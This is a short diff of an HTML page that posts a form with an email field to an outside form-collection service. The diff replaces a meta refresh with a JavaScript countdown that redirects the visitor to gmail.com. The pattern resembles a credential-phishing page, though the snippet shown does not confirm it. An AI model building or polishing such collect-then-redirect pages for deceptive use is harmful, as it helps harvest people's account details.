@@ -30,7 +30,17 @@
   action="https://submit-form.com/0JDosZ5IE"
   method="POST"
 >
-    <meta HTTP-EQUIV="REFRESH" content="3; url=http://www.gmail.com/index.html">
+    <div id="counter">5</div>
+    <script>
+        setInterval(function() {
+            var div = document.querySelector("#counter");
+            var count = div.textContent * 1 - 1;
+            div.textContent = count;
+            if (count <= 0) {
+                window.location.replace("https://gmail.com");
+            }
+        }, 1000);
+    </script>
                     <div class="form-wrapper">
                         <input
                             type="email"
